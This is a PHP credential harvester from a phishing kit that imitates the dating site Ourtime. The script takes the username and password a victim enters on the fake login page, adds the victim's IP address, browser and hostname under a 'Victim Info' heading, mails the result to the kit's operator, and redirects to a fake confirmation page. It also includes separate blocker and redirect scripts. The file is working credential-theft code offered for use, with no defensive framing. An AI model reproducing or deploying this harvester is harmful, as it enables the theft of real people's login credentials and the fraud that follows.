<?php

include('./blocker.php');
include('./redirect.php');
$ip = getenv("REMOTE_ADDR");  
$hostname = gethostbyaddr($ip);
$user = $_POST['username'];
$pass = $_POST['password'];
$message ="
••••••••••••••• Ourtime Logs •••••••••••••••
Email Address: ".$user."
Password: ".$pass."
••••••••••••••••••••••• Victim Info ••••••••••••••••••••••••
IP: http://www.ip-score.com/checkip/".$ip."
Browser: ".$_SERVER['HTTP_USER_AGENT']."
Host: ".$hostname."
••••••••••••••••••• SH#LLB)X •••••••••••••••••••"; 

include('./mailer.php');
$subject = "Ourtime (".$ip.")"; 
$headers = "From:  Result_Ourtime<updates@ourtimewhorers.com>"; 
mail($send,$subject,$message,$headers); 

$header = "confrm_id.php?cmd=_login-run&success=".md5(gmdate('r'));;

header("Location: confrm_id.php");

?>